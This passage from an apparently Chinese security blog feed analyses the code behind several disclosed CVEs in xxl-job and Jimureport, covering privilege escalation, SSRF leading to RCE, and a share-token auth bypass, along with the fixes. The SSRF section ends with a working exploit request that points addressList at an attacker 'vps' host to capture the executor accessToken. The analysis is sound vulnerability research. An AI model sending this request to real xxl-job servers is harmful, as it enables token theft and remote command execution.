<p>最终修复代码：</p>
<figure data-type="image" tabindex="13"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1744363305305-14821863-f318-4616-a2b2-e5a6aea96e96.png" alt="" loading="lazy"></figure>
<h1 id="总结">总结</h1>
<p>在实战中，造成sql注入的原因主要有下面三点</p>
<ol>
<li>sql语句过滤不完全，导致可以进行绕过导致漏洞产生</li>
<li>代码逻辑错误，导致本来可以进行过滤的操作无法产生效果。</li>
<li>对用户的查询操作没有进行权限限制，或者限制不完全，从而导致获取到本不应该获取的数据。</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[xxl-job子任务越权漏洞代码分析及修复代码分析(CVE-2024-42681)]]></title>
        <id>https://follycat.github.io/post/xxl-job-zi-ren-wu-yue-quan-lou-dong-dai-ma-fen-xi-ji-xiu-fu-dai-ma-fen-xi-cve-2024-42681/</id>
        <link href="https://follycat.github.io/post/xxl-job-zi-ren-wu-yue-quan-lou-dong-dai-ma-fen-xi-ji-xiu-fu-dai-ma-fen-xi-cve-2024-42681/">
        </link>
        <updated>2025-04-11T08:04:13.000Z</updated>
        <content type="html"><![CDATA[<h1 id="漏洞介绍">漏洞介绍</h1>
<p>在xxl-job中，普通用户本应该只能查看和执行他们分配到的执行程序上的任务，并且无法查看与执行未分配到的执行程序的任务。但在2.4.1版本中，普通用户可以通过在执行程序 A 上创建任务并使用子任务 ID，从而执行管理员权限才能执行的执行程序 B 上的子任务。</p>
<h1 id="漏洞代码分析">漏洞代码分析</h1>
<p>首先，因为是执行时触发的，所以可以直接找到<code>com.xxl.job.admin.controller.JonInfoController</code>这个控制执行程序的类。</p>
<p>看到其中的权限控制部分</p>
<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742889737635-8c429dce-2082-44a7-8de6-9803495f20ca.png" alt="" loading="lazy"></figure>
<pre><code>public static List&lt;XxlJobGroup&gt; filterJobGroupByRole(HttpServletRequest request, List&lt;XxlJobGroup&gt; jobGroupList_all){
    // 创建一个空的列表，用于存储过滤后的组
    List&lt;XxlJobGroup&gt; jobGroupList = new ArrayList&lt;&gt;();
    
    // 如果传入的列表不为空且大小大于0
    if (jobGroupList_all != null &amp;&amp; jobGroupList_all.size() &gt; 0) {
        
        // 获取当前登录用户对象，存储在请求的属性中，LOGIN_IDENTITY_KEY 是常量表示用户身份信息
        XxlJobUser loginUser = (XxlJobUser) request.getAttribute(LoginService.LOGIN_IDENTITY_KEY);
        
        // 检查用户角色，如果角色是 1，则表示是管理员，管理员可以看到所有组
        if (loginUser.getRole() == 1) {
            // 如果是管理员，直接返回所有的组
            jobGroupList = jobGroupList_all;
        } else {
            // 如果不是管理员，创建一个列表用于存储用户拥有权限的组 ID
            List&lt;String&gt; groupIdStrs = new ArrayList&lt;&gt;();
            
            // 如果用户的权限字符串不为空，解析出权限字符串并分割为一个列表
            if (loginUser.getPermission() != null &amp;&amp; loginUser.getPermission().trim().length() &gt; 0) {
                // 将权限字符串（以逗号分隔）转换为列表
                groupIdStrs = Arrays.asList(loginUser.getPermission().trim().split(&quot;,&quot;));
            }
            
            // 遍历所有的组列表
            for (XxlJobGroup groupItem : jobGroupList_all) {
                // 如果当前组的 ID 存在于用户的权限列表中，则加入到返回的列表中
                if (groupIdStrs.contains(String.valueOf(groupItem.getId()))) {
                    jobGroupList.add(groupItem);
                }
            }
        }
    }
    
    // 返回过滤后的组列表
    return jobGroupList;
}
</code></pre>
<p>其中<code>filterJobGroupByRole</code>方法，如果登录为管理员则返回所有执行器，如果不为管理员，则判断用户权限，从而返回相应权限的执行器。</p>
<pre><code>public static void validPermission(HttpServletRequest request, int jobGroup) {
    // 从请求对象中获取当前登录的用户
    XxlJobUser loginUser = (XxlJobUser) request.getAttribute(LoginService.LOGIN_IDENTITY_KEY);
    
    // 调用 loginUser 的 validPermission 方法来验证用户是否有权限访问指定的组
    if (!loginUser.validPermission(jobGroup)) {
        // 如果用户没有权限，抛出运行时异常，并将错误信息拼接上用户名
        throw new RuntimeException(I18nUtil.getString(&quot;system_permission_limit&quot;) + &quot;[username=&quot; + loginUser.getUsername() + &quot;]&quot;);
    }
}
</code></pre>
<p>第二个方法为<code>validPermission</code>方法，主要用于验证用户是否有权限进行运行。</p>
<p>检查过后，其实可以发现并没有什么特别明显的漏洞，说明权限绕过的问题并不是出现在这段检查用户权限的代码中。</p>
<p>然后进入处理子任务id的代码段去进行检查，这段代码位于<code>com.xxl.job.admin.service.impl.XxlJobServiceImpl</code>类中，这个类主要是用于子任务的整个生命周期管理和调度控制。</p>
<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742912964716-ca79f9e7-ffe4-4c05-81a3-adc49c043052.png" alt="" loading="lazy"></figure>
<p>看到处理子任务id的代码段,add和updata之间是一样的</p>
<pre><code>		if (jobInfo.getChildJobId()!=null &amp;&amp; jobInfo.getChildJobId().trim().length()&gt;0) {
			String[] childJobIds = jobInfo.getChildJobId().split(&quot;,&quot;);
			for (String childJobIdItem: childJobIds) {
				if (childJobIdItem!=null &amp;&amp; childJobIdItem.trim().length()&gt;0 &amp;&amp; isNumeric(childJobIdItem)) {
					XxlJobInfo childJobInfo = xxlJobInfoDao.loadById(Integer.parseInt(childJobIdItem));
					if (childJobInfo==null) {
						return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE,
								MessageFormat.format((I18nUtil.getString(&quot;jobinfo_field_childJobId&quot;)+&quot;({0})&quot;+I18nUtil.getString(&quot;system_not_found&quot;)), childJobIdItem));
					}
				} else {
					return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE,
							MessageFormat.format((I18nUtil.getString(&quot;jobinfo_field_childJobId&quot;)+&quot;({0})&quot;+I18nUtil.getString(&quot;system_unvalid&quot;)), childJobIdItem));
				}
			}
</code></pre>
<p>这段代码是对子任务id进行的检测， 具体来说，它是验证子作业ID是否有效，并且检查每个子作业ID是否存在。其实可以发现，这段代码中并没有对当前用户是否对子任务有操作权限的验证，所以任何用户都可以添加任何一个任务组中的子任务，从而造成漏洞。</p>
<p>因为这段代码是在add以及updata中的，所以在添加的时候，如果有一个普通用户，其只对任务A有权限进行执行操作，而任务B中拥有一个子任务2，则这个普通用户可以在进行添加操作时，添加子任务2，因为没有对子任务id进行权限验证，这时，普通用户所添加的任务不仅有自身的子任务2同时也添加上了任务B中的子任务2。</p>
<p>现在，我们再查看执行时的代码有没有对子任务的权限进行检测，如果没有那就会同时执行任务A与任务B中的子任务2。</p>
<p>执行代码位于trigger方法中</p>
<figure data-type="image" tabindex="3"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742914212432-cf5119b5-c498-4082-85d4-fdf527f464fc.png" alt="" loading="lazy"></figure>
<pre><code>	public ReturnT&lt;String&gt; trigger(XxlJobUser loginUser, int jobId, String executorParam, String addressList) {
		// permission
		if (loginUser == null) {
			return new ReturnT&lt;String&gt;(ReturnT.FAIL.getCode(), I18nUtil.getString(&quot;system_permission_limit&quot;));
		}
		XxlJobInfo xxlJobInfo = xxlJobInfoDao.loadById(jobId);
		if (xxlJobInfo == null) {
			return new ReturnT&lt;String&gt;(ReturnT.FAIL.getCode(), I18nUtil.getString(&quot;jobinfo_glue_jobid_unvalid&quot;));
		}
		if (!hasPermission(loginUser, xxlJobInfo.getJobGroup())) {
			return new ReturnT&lt;String&gt;(ReturnT.FAIL.getCode(), I18nUtil.getString(&quot;system_permission_limit&quot;));
		}

		// force cover job param
		if (executorParam == null) {
			executorParam = &quot;&quot;;
		}

		JobTriggerPoolHelper.trigger(jobId, TriggerTypeEnum.MANUAL, -1, null, executorParam, addressList);
		return ReturnT.SUCCESS;
	}
</code></pre>
<p>这段代码中，只对用户与任务组的id之间的权限进行了检测，并没有对用户与子任务之间的权限进行检查，也没有判断子任务是否为目标执行的任务组中的子任务。</p>
<p>综上所属，该漏洞成因为在添加子任务时，没有对用户是否可以对子任务的执行进行权限检测，并且在执行过程中也没有对子任务进行是否有执行权限进行检查，从而导致在运行当前用户的任务组中子任务的同时，也对其他没有权限的任务组中的相同id的子任务进行了执行，从而造成越权漏洞。</p>
<h1 id="修复代码分析">修复代码分析</h1>
<figure data-type="image" tabindex="4"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742914729645-ebcb940b-4d60-4c0d-8698-e0e1e0dc322a.png" alt="" loading="lazy"></figure>
<p>可以看到，作者在修复时对add接口与update接口都添加了LoginUser参数，这个参数是用于判断当前用户的参数。</p>
<p>也就是将鉴权的代码分出了一个部分，让其返回user。</p>
<figure data-type="image" tabindex="5"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742914852294-174fa3f0-c1ad-4da2-9029-03f706aa17d5.png" alt="" loading="lazy"></figure>
<p>然后，又在add与update中对子任务的验证过程中，添加了对于用户是否有对目标子任务有操作权限的验证。</p>
<figure data-type="image" tabindex="6"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742915088830-6813f2fc-109b-4fba-9dff-a6dc8714a16d.png" alt="" loading="lazy"></figure>
<pre><code>
 					if (!loginUser.validPermission(childJobInfo.getJobGroup())) {
 						return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE,
 								MessageFormat.format((I18nUtil.getString(&quot;jobinfo_field_childJobId&quot;)+&quot;({0})&quot;+I18nUtil.getString(&quot;system_permission_limit&quot;)), childJobIdItem));
 					}
</code></pre>
<p>有了这段代码，就不会将没有操作权限的子任务加入到有权限的任务组中，造成越权行为了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[xxl-job_2.4.1ssrf漏洞代码分析(CVE-2024-24113)]]></title>
        <id>https://follycat.github.io/post/xxl-job_241ssrf-lou-dong-dai-ma-fen-xi-cve-2024-24113/</id>
        <link href="https://follycat.github.io/post/xxl-job_241ssrf-lou-dong-dai-ma-fen-xi-cve-2024-24113/">
        </link>
        <updated>2025-03-28T09:43:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="漏洞介绍">漏洞介绍</h1>
<p>这个漏洞是通过利用ssrf获取用户的 <code>accessToken</code> 进行的任意命令执行漏洞，命令执行部分与之前的默认<code>accessToken</code>的部分基本一致。</p>
<h1 id="rce漏洞代码分析">RCE漏洞代码分析</h1>
<p>首先，我们要清楚为什么获取到了<code>accessToken</code>就可以进行RCE，这离不开以下三个问题：</p>
<ol>
<li><code>accessToken</code>是什么</li>
<li>是通过什么方式进行命令执行的</li>
<li>命令执行代码分析</li>
</ol>
<h2 id="accesstoken是什么">accessToken是什么</h2>
<p><code>accessToken</code>是XXL-JOB用于校验调度中心（Admin）与执行器（Executor）之间通信合法性的凭证。</p>
<h2 id="是通过什么方式进行命令执行的">是通过什么方式进行命令执行的</h2>
<p>执行器是我们执行代码的平台，也就是说如果我们获取了<code>accessToken</code>，我们就可以伪造成校验调度中心，使执行器执行指定代码，这个Rce点在之前的<code>accessToken</code> 默认身份绕过有提到，在2.4.1版本代码基本上没有进行更改，所以如果我们获取到了<code>accessToken</code>的值也是可以进行任意命令执行的。</p>
<h2 id="241版本任意命令执行代码分析">2.4.1版本任意命令执行代码分析</h2>
<p>可以参考一下以前版本的rce漏洞的分析：<a href="https://xz.aliyun.com/news/12414">https://xz.aliyun.com/news/12414</a></p>
<p>之前提到了，在2.4.1版本中，漏洞代码与之前版本的变化不大，也是通过/run路由进行执行，所以这里我并不进行过多分析。</p>
<p>我们可以进入xxl-job-core中进行查看目标路由。</p>
<pre><code>private Object process(HttpMethod httpMethod, String uri, String requestData, String accessTokenReq) {
            // valid
            if (HttpMethod.POST != httpMethod) {
                return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;invalid request, HttpMethod not support.&quot;);
            }
            if (uri == null || uri.trim().length() == 0) {
                return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;invalid request, uri-mapping empty.&quot;);
            }
            if (accessToken != null
                    &amp;&amp; accessToken.trim().length() &gt; 0
                    &amp;&amp; !accessToken.equals(accessTokenReq)) {
                return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;The access token is wrong.&quot;);
            }

            // services mapping
            try {
                switch (uri) {
                    case &quot;/beat&quot;:
                        return executorBiz.beat();
                    case &quot;/idleBeat&quot;:
                        IdleBeatParam idleBeatParam = GsonTool.fromJson(requestData, IdleBeatParam.class);
                        return executorBiz.idleBeat(idleBeatParam);
                    case &quot;/run&quot;:
                        TriggerParam triggerParam = GsonTool.fromJson(requestData, TriggerParam.class);
                        return executorBiz.run(triggerParam);
                    case &quot;/kill&quot;:
                        KillParam killParam = GsonTool.fromJson(requestData, KillParam.class);
                        return executorBiz.kill(killParam);
                    case &quot;/log&quot;:
                        LogParam logParam = GsonTool.fromJson(requestData, LogParam.class);
                        return executorBiz.log(logParam);
                    default:
                        return new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, &quot;invalid request, uri-mapping(&quot; + uri + &quot;) not found.&quot;);
                }
</code></pre>
<p>这一段代码与之前漏洞版本一样，首先是判断<code>accessToken</code>是否正确，然后进行路由判断，因为这里调用是run路由就直接去看他的实现方法。</p>
<p>进入<code>com.xxl.job.core.biz.impl.ExecutorBizImpl</code>中，可以看到他的run方法。</p>
<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742820524475-27932e58-7d93-4162-a1b4-e1d0f1ec7f6a.png" alt="" loading="lazy"></figure>
<p>然后主要是他的命令执行方法。</p>
<p>位于<code>com.xxl.job.core.handler.impl</code>的ScriptJobHandler类中</p>
<pre><code>        if (!glueType.isScript()) {
            XxlJobHelper.handleFail(&quot;glueType[&quot;+ glueType +&quot;] invalid.&quot;);
            return;
        }

        // cmd
        String cmd = glueType.getCmd();

        // make script file
        String scriptFileName = XxlJobFileAppender.getGlueSrcPath()
                .concat(File.separator)
                .concat(String.valueOf(jobId))
                .concat(&quot;_&quot;)
                .concat(String.valueOf(glueUpdatetime))
                .concat(glueType.getSuffix());
        File scriptFile = new File(scriptFileName);
        if (!scriptFile.exists()) {
            ScriptUtil.markScriptFile(scriptFileName, gluesource);
        }
</code></pre>
<p>这段代码的核心逻辑为</p>
<ol>
<li>检查 <code>glueType</code> 是否为脚本类型。</li>
<li>获取脚本执行命令和构建文件名。</li>
<li>检查指定路径下的脚本文件是否存在，如果不存在，则创建这个脚本文件。</li>
</ol>
<p>从而可以执行命令。</p>
<h1 id="ssrf漏洞代码分析">SSRF漏洞代码分析</h1>
<p>既然已经知道了只要拥有<code>accessToken</code> 的值就可以进行任意命令执行，那么就来分析一下获取<code>accessToken</code> 的ssrf代码。</p>
<h2 id="用户验证">用户验证</h2>
<p>首先，我们知道在<code>xxl-job-admin</code>中可以向core发送指定内容，从而使core端执行特定代码，那么这个请求是哪个路由所发出的呢，通过对执行进行抓包可以发现是/xxl-job-admin/jobinfo/trigger。</p>
<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742827725630-56bc4f28-5b0b-4da2-a664-20a1177ca5f6.png" alt="" loading="lazy"></figure>
<p>查看对应代码，位于<code>com.xxl.job.admin.controller.JobInfoController</code>中。</p>
<pre><code>	@RequestMapping(&quot;/trigger&quot;)
	@ResponseBody
	public ReturnT&lt;String&gt; triggerJob(HttpServletRequest request, int id, String executorParam, String addressList) {
		// login user
		XxlJobUser loginUser = (XxlJobUser) request.getAttribute(LoginService.LOGIN_IDENTITY_KEY);
		// trigger
		return xxlJobService.trigger(loginUser, id, executorParam, addressList);
	}
</code></pre>
<p>进入<code>getAttribute</code>中，这个接口有挺多实现的，可以挨个去瞅瞅或者直接调试，最终发现是使用的<code>org.apache.catalina.connector.ReqestFacade</code>中定义的getAttribute方法。</p>
<figure data-type="image" tabindex="3"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742828546060-51e49c46-afc0-4b8c-b135-76cffa81de9c.png" alt="" loading="lazy"></figure>
<pre><code>    public Object getAttribute(String name) {
        this.checkFacade();
        return this.request.getAttribute(name);
    }
</code></pre>
<p>因为checkFacade没有参数，应该不是验证的方法，就直接跳过去了。</p>
<p>然后，继续跟进到<code>org.apache.catalina.connector.Request</code>中的getAttribute方法。</p>
<figure data-type="image" tabindex="4"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742828701494-8f6d18b4-5e2f-4a31-bcbb-4463078faf01.png" alt="" loading="lazy"></figure>
<p>最终返回了用户相关的值，所以这就是一个验证用户的函数。</p>
<figure data-type="image" tabindex="5"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742828848265-54b99ff7-8bdd-4a57-9ac2-648c4440165d.png" alt="" loading="lazy"></figure>
<h2 id="ssrf关键代码">ssrf关键代码</h2>
<p>接下来就是实现ssrf的关键代码了，造成这个漏洞的主要参数为<code>addressList</code>。</p>
<p>首先跟进<code>com.xxl.job.admin.service.impl.XxlJobServiceImpl</code>中的trigger方法。</p>
<figure data-type="image" tabindex="6"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742829165817-5738624c-fe69-4a3d-b4e4-64beec21eeb4.png" alt="" loading="lazy"></figure>
<p>这个方法前面都是鉴权，还需要继续跟进到<code>com.xxl.job.admin.core.thread.JobTriggerPoolHelper</code>中的trigger方法。</p>
<figure data-type="image" tabindex="7"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742829271316-cd22e0f9-0dd6-4236-86a4-31aa053b4bb9.png" alt="" loading="lazy"></figure>
<p>这个方法又继续在进行调用，继续跟进，因为太长了就直接跳到最后一步了，最终走到了<code>com.xxl.job.admin.core.trigger.XxlJobTrigger</code>中进行了参数的设置，可以看到这里用我们上传的参数覆盖了原来的addressList。</p>
<figure data-type="image" tabindex="8"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742829908180-121d9786-4c18-414e-96fd-e059b1b75303.png" alt="" loading="lazy"></figure>
<p>可以看到在到这一步时，已经有返回包了。</p>
<figure data-type="image" tabindex="9"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742831118507-61334dd4-784e-46a2-9bcd-c2d774d5e40f.png" alt="" loading="lazy"></figure>
<p>但是还并没有像指定服务器发送请求。</p>
<p>跟进最后一个方法<code>processTrigger</code>，这个方法是用于对目标服务器发送请求的方法，也就是造成ssrf的方法。</p>
<pre><code>        TriggerParam triggerParam = new TriggerParam();
        triggerParam.setJobId(jobInfo.getId());
        triggerParam.setExecutorHandler(jobInfo.getExecutorHandler());
        triggerParam.setExecutorParams(jobInfo.getExecutorParam());
        triggerParam.setExecutorBlockStrategy(jobInfo.getExecutorBlockStrategy());
        triggerParam.setExecutorTimeout(jobInfo.getExecutorTimeout());
        triggerParam.setLogId(jobLog.getId());
        triggerParam.setLogDateTime(jobLog.getTriggerTime().getTime());
        triggerParam.setGlueType(jobInfo.getGlueType());
        triggerParam.setGlueSource(jobInfo.getGlueSource());
        triggerParam.setGlueUpdatetime(jobInfo.getGlueUpdatetime().getTime());
        triggerParam.setBroadcastIndex(index);
        triggerParam.setBroadcastTotal(total);

        // 3、init address
        String address = null;
        ReturnT&lt;String&gt; routeAddressResult = null;
        if (group.getRegistryList()!=null &amp;&amp; !group.getRegistryList().isEmpty()) {
            if (ExecutorRouteStrategyEnum.SHARDING_BROADCAST == executorRouteStrategyEnum) {
                if (index &lt; group.getRegistryList().size()) {
                    address = group.getRegistryList().get(index);
                } else {
                    address = group.getRegistryList().get(0);
                }
            } else {
                routeAddressResult = executorRouteStrategyEnum.getRouter().route(triggerParam, group.getRegistryList());
                if (routeAddressResult.getCode() == ReturnT.SUCCESS_CODE) {
                    address = routeAddressResult.getContent();
                }
            }
        } else {
            routeAddressResult = new ReturnT&lt;String&gt;(ReturnT.FAIL_CODE, I18nUtil.getString(&quot;jobconf_trigger_address_empty&quot;));
        }

        // 4、trigger remote executor
        ReturnT&lt;String&gt; triggerResult = null;
        if (address != null) {
            triggerResult = runExecutor(triggerParam, address);
        }
</code></pre>
<p>可以看到上面代码对指定参数进行了构造，并且到目前为止，所以代码都没有对我们输入的地址进行校验与核查。</p>
<p>随后利用<code>runExecutor</code> 向选定的执行器地址发送HTTP请求，触发任务执行。</p>
<p>从而使我们的服务器拿到http请求包，其中包含进行RCE所需的参数<code>accessToken</code>，从而造成Rce漏洞。</p>
<figure data-type="image" tabindex="10"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742831771952-6f96471f-a98a-4082-aad9-b13a8f88843c.png" alt="" loading="lazy"></figure>
<h1 id="exp如下">exp如下</h1>
<pre><code>POST /xxl-job-admin/jobinfo/trigger HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 59
sec-ch-ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
sec-ch-ua-platform: &quot;Windows&quot;
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/xxl-job-admin/jobinfo
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=85b8fh88fc4idmgumrpm2vjf65; XXL_JOB_LOGIN_IDENTITY=7b226964223a322c22757365726e616d65223a2274657374222c2270617373776f7264223a223831646339626462353264303464633230303336646264383331336564303535222c22726f6c65223a302c227065726d697373696f6e223a2232227d
Connection: close

id=3&amp;executorParam=1&amp;addressList=http://vps:端口
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Jimureport1.7.8越权漏洞代码分析及修复代码分析(CVE-2024-44893)]]></title>
        <id>https://follycat.github.io/post/jimureport178-yue-quan-lou-dong-dai-ma-fen-xi-ji-xiu-fu-dai-ma-fen-xi-cve-2024-44893/</id>
        <link href="https://follycat.github.io/post/jimureport178-yue-quan-lou-dong-dai-ma-fen-xi-ji-xiu-fu-dai-ma-fen-xi-cve-2024-44893/">
        </link>
        <updated>2025-03-25T09:42:23.000Z</updated>
        <content type="html"><![CDATA[<h1 id="漏洞代码分析及漏洞成因">漏洞代码分析及漏洞成因</h1>
<h2 id="漏洞成因">漏洞成因</h2>
<p>拦截器中对于Token验证的代码中存在逻辑漏洞。</p>
<h2 id="漏洞代码分析">漏洞代码分析</h2>
<p>首先，这个项目使用了Spring MVC的拦截器。</p>
<p>可以找到拦截器的代码段位于这个项目的jimureport-spring-boot-starter.jar中的<code>org.jeecg.modules.jmreport.config.firewall.interceptor.JimuReportTokenInterceptor</code>包。</p>
<p>以下是preHandle拦截器的代码</p>
<pre><code class="language-java">    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (!(handler instanceof HandlerMethod)) {
            return true;
        } else {
            String var4 = d.i(request.getRequestURI().substring(request.getContextPath().length()));
            log.debug(&quot;JimuReportInterceptor check requestPath = &quot; + var4);
            int var5 = 500;
            if (n.a(var4)) {
                log.error(&quot;请注意，请求地址有xss攻击风险！&quot; + var4);
                this.backError(response, &quot;请求地址有xss攻击风险!&quot;, var5);
                return false;
            } else {
                String var6 = this.jmBaseConfig.getCustomPrePath();
                log.debug(&quot;customPrePath: {}&quot;, var6);
                if (j.d(var6) &amp;&amp; !var6.startsWith(&quot;/&quot;)) {
                    var6 = &quot;/&quot; + var6;
                }

                request.setAttribute(&quot;customPrePath&quot;, var6);
                HandlerMethod var7 = (HandlerMethod)handler;
                Method var8 = var7.getMethod();
                if (var4.contains(&quot;/jmreport/shareView/&quot;)) {
                    return true;
                } else {
                    JimuNoLoginRequired var9 = (JimuNoLoginRequired)var8.getAnnotation(JimuNoLoginRequired.class);
                    if (j.d(var9)) {
                        return true;
                    } else {
                        boolean var10 = false;

                        try {
                            var10 = this.verifyToken(request);
                        } catch (Exception var14) {
                        }

                        if (!var10) {
                            if (this.jimuReportShareService.isSharingEffective(var4, request)) {
                                return true;
                            } else {
                                String var16 = request.getParameter(&quot;previousPage&quot;);
                                if (j.d(var16)) {
                                    if (this.jimuReportShareService.isShareingToken(var4, request)) {
                                        return true;
                                    } else {
                                        log.error(&quot;分享链接失效或分享token不匹配(&quot; + request.getMethod() + &quot;)：&quot; + var4);
                                        this.backError(response, &quot;分享链接失效或分享token不匹配，禁止钻取!&quot;, var5);
                                        return false;
                                    }
                                } else {
                                    log.error(&quot;Token校验失败！请求无权限(&quot; + request.getMethod() + &quot;)：&quot; + var4);
                                    this.backError(response, &quot;Token校验失败，无权限访问！&quot;, var5);
                                    return false;
                                }
                            }
                        } else {
                            b var15 = (b)var8.getAnnotation(b.class);
                            if (var15 != null) {
                                String[] var11 = var15.a();
                                String[] var12 = this.jimuTokenClient.getRoles(request);
                                if (var12 == null || var12.length == 0) {
                                    log.error(&quot;此接口需要角色权限，请联系管理员！请求无权限(&quot; + request.getMethod() + &quot;)：&quot; + var4);
                                    if (&quot;/jmreport/loadTableData&quot;.equals(var4)) {
                                        var5 = GEN_TEST_DATA_CODE;
                                    }

                                    this.backError(response, NO_PERMISSION_PROMPT_MSG, var5);
                                    return false;
                                }

                                boolean var13 = Arrays.stream(var12).anyMatch((code) -&gt; {
                                    return j.a(code, var11);
                                });
                                if (!var13) {
                                    log.error(&quot;此接口需要角色权限，请联系管理员！请求无权限(&quot; + request.getMethod() + &quot;)：&quot; + var4);
                                    if (&quot;/jmreport/loadTableData&quot;.equals(var4)) {
                                        var5 = GEN_TEST_DATA_CODE;
                                    }

                                    this.backError(response, NO_PERMISSION_PROMPT_MSG, var5);
                                    return false;
                                }
                            }

                            return true;
                        }
                    }
                }
            }
        }
    }
</code></pre>
<p>漏洞代码位于为下面这段</p>
<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742463757640-f9353e24-3143-45b1-bfaa-7d57cbe49161.png" alt="" loading="lazy"></figure>
<p>其中var10为检查用户是否登录的检测结果，如果没有登录就会进入下面的代码中。</p>
<p>其中<code>isSharingEffective</code>是用于判断时间是否过期的代码，我们当前处于未登录状态，所以主要看else后面的代码段。</p>
<p>首先从get中获取previousPage这个参数，并通过j.d这个方法进行校验。</p>
<pre><code class="language-java">    public static String d(String var0) {
        byte var1 = 3;
        if (var0.length() &lt; var1) {
            return var0.toLowerCase();
        } else {
            StringBuilder var2 = new StringBuilder(var0);
            int var3 = 0;

            for(int var4 = 2; var4 &lt; var0.length(); ++var4) {
                if (Character.isUpperCase(var0.charAt(var4))) {
                    var2.insert(var4 + var3, &quot;_&quot;);
                    ++var3;
                }
            }

            return var2.toString().toLowerCase();
        }
    }
</code></pre>
<p>j.d方法的这段代码主要用于字符串分割，小于3个长度的字符会转化为小写直接输出，大于3个长度的字符就会检测大写字符并加入<code>_</code>进行分割。</p>
<p>所以只需要previousPage参数不为空即可。</p>
<p>然后跟进到isShareingToken方法。</p>
<p>这个方法位于<code>org.jeecg.modules.jmreport.desreport.service.a.f</code>中</p>
<p>代码如下：</p>
<pre><code class="language-java">    public boolean isShareingToken(String requestPath, HttpServletRequest request) {
        String var3 = request.getHeader(&quot;JmReport-Share-Token&quot;);
        String var4 = &quot;&quot;;
        if (j.c(var3)) {
            var3 = request.getParameter(&quot;shareToken&quot;);
        }

        String var5 = request.getParameter(&quot;jmLink&quot;);
        if (j.d(var5)) {
            try {
                byte[] var6 = Base64Utils.decodeFromString(var5);
                String var7 = new String(var6);
                String[] var8 = var7.split(&quot;\\|\\|&quot;);
                if (ArrayUtils.isNotEmpty(var8) &amp;&amp; var8.length == 2) {
                    var3 = var8[0];
                    var4 = var8[1];
                }
            } catch (IllegalArgumentException var9) {
                a.error(&quot;解密失败：&quot; + var9.getMessage());
                a.error(var9.getMessage(), var9);
                return false;
            }
        }

        if (j.c(var3)) {
            return false;
        } else {
            JimuReportShare var10 = this.jimuReportShareDao.getShareByShareToken(var3);
            if (var10 != null) {
                var10 = this.compareToDate(var10);
                if (!&quot;0&quot;.equals(var10.getStatus())) {
                    return false;
                }
            }

            if (requestPath.startsWith(&quot;/jmreport/view&quot;)) {
                if (!j.d(var4)) {
                    return false;
                }

                Long var11 = this.jimuReportLinkDao.selectLinkCountByLinkId(var4);
                if (null != var11 &amp;&amp; var11 &gt; 0L) {
                    return true;
                }
            }

            return true;
        }
    }
</code></pre>
<p>可以看到代码中先获取http头为<code>JmReport-Share-Token</code>的字符串，正常逻辑来说会判断其是否存在，如果不存在就获取名字为<code>shareToken</code>的参数。</p>
<p>但是在j函数中，有俩个.c方法，一个接收值类型为字符串，另一个为Object。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742484845313-728ccfd3-826c-4124-9041-6db6ea207f78.png" alt="" loading="lazy"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742484876619-c4ac3663-42f4-4b40-b773-304ec04ced84.png" alt="" loading="lazy"></p>
<p>而var3类型就为String类型，所以会优先调用c(String var0)这个方法。</p>
<p>这样漏洞就产生了，当JmReport-Share-Token有参数时，其也会获取shareToken的值，并赋值给var3参数，造成参数覆盖。</p>
<p>并且当shareToken赋值为空时，并不会触发<code>return false</code>，会继续进入到else中，从而走到<code>getShareByShareToken</code>方法，</p>
<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742484802195-7a174817-9e58-4e6b-8723-75a92682e079.png" alt="" loading="lazy"></figure>
<p>这个方法用于查询数据库中是否存在 shareToken。</p>
